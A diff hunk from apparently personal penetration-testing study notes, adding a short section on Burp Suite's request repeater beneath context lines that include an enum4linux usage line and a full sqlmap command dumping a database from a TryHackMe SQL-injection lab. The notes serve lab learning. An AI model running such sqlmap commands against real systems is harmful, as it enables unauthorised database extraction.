@@ -122,3 +122,10 @@ $ ./enum4linux.pl <options> <ip>
 * sqlmap -u http://10.10.55.189:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump --threads 10
 * https://tryhackme.com/room/sqlilab
 * See tamper script
+
+<hr class="sep-both">
+
+## Burp
+
+* take a request captured in the Proxy, edit it, and send the same request repeatedly as many times as we wish
+* tabs per request
